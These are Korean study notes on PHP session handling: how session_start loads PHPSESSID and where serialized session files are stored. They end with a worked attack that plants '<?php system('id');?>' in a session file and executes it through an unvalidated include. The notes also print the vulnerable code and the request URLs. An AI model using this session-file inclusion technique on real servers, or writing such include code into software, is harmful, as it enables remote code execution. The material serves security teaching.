PHP :
    Session :
        가장 기본적인 사용 형태
            <?php
            session_start(); // session 사용을 위해 필수적으로 사용되어야 함.
            $_SESSION['uid'] = 1234; // 해당 유저의 session['uid']에 int 1234 로 할당 

        기본 세션 관리 로직
            1. session_start()
                - HTTP Request에서 쿠키를 가져와 PHPSESSID(php 기본 Session ID, 쿠키를 통해 서버와 사용자가 주고받는 php session의 이름)의 값을 가져옵니다.
                - PHPSESSID값이 존재하지 않으면 랜덤한 값의 PHPSESSID를 생성하고 세션 변수에($_SESSION) 빈 array를 할당합니다.
                - PHPSESSID값이 있으면 해당 PHPSESSID에 해당하는 값을 세션 변수에($_SESSION) 로드합니다.

            2. $_SESSION 변수에 접근해 값을 읽거나 변경
                
                <?php
                session_start();
                $_SESSION['uid'] = 1000; // uid에 1000 할당
                $_SESSION['name'] = "dreamhack"; // name에 "dreamhack" 할당
                echo $_SESSION['name']; // session에 저장된 name 출력.
                // dreamhack

            3. session_start로 시작된 해당 페이지(PHP)가 종료될 때 자동으로 세션 변수를 serialize한 값을 파일 시스템에 저장합니다.
                - 기본적으로 파일 시스템의 {세션기본경로}/sess_{PHPSESSID값} 경로에 저장됩니다.
                
                # ls -al /var/lib/php/sessions/
                total 28
                drwx-wx-wt 2 root     root     4096 Mar  6 04:32 .
                drwxr-xr-x 4 root     root     4096 Sep  2  2019 ..
                -rw------- 1 www-data www-data   13 Jan 31 08:52 sess_2bahu3lkck1089v5mrr8dhd657
                ...
                -rw------- 1 www-data www-data   32 Jan 31 10:17 sess_sr3b6npc15nu6sqsdrb959qp74
                # cat sess_sr3b6npc15nu6sqsdrb959qp74
                uid|i:1000;name|s:9:"dreamhack";

        리눅스 시스템의 세션 기본 경로
            /var/lib/php/sessions

            세션에서 사용되는 키(PHPSESSID)를 사용자는 쿠키의 정보를 확인하여 알 수 있기 떄문에 서버의 파일 시스템에서 세션 파일이 저장되는 경로와 파일을 추측 가능.

            세션에 사용자의 입력 데이터가 들어가게 된다면 다른 공격과 연계하여 사용 가능
                예) include 함수의 인자를 조작 가능, 인자에 대한 검증이 없는 페이지에서 세션 파일을 include 인자로 넘겨 원하는 PHP 코드 실행 가능

                    session.php

                    <?php
                    session_start();
                    $_SESSION['name'] = $_GET['name']; // 사용자 입력 데이터를 세션에 저장

                    입력 : /session.php?name=<?php system('id');?>
                    php 코드를 세션에 삽입할 수 있습니다.

                    # ls -al /var/lib/php/sessions/
                    total 28
                    drwx-wx-wt 2 root     root     4096 Mar  6 04:32 .
                    drwxr-xr-x 4 root     root     4096 Sep  2  2019 ..
                    -rw------- 1 www-data www-data   34 Jan 31 08:52 sess_d54ejehuaq8ksuoatpeph898q3
                    # cat sess_d54ejehuaq8ksuoatpeph898q3
                    name|s:21:"<?php system('id');?>";                

                    index.php
                    
                    <?php
                    include $_GET['page']; // 사용자의 입력 데이터를 기반으로 include 실행.

                    같은 서버에 include 취약점 존재하는 경로 존재시
                    /index.php?page=/var/lib/php/sessions/sess_d54ejehuaq8ksuoatpeph898q3
                    와 같이 세션 파일은 include 하여 세션 파일에 작성되어 있는 php 코드를 실행하는 공격이 가능



